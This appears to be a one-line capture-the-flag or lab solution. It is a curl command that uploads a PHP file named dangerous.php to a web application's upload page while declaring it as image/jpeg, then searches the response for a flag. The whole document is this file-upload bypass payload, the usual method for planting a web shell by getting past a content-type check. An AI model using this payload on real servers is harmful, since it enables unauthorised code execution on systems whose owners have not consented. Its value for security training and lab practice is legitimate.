curl -F "Upload=Upload" -H 'Content-Type: multipart/form-data' -F "uploaded=@dangerous.php;type=image/jpeg" 'http://192.168.X.X/?page=upload' | grep 'flag'
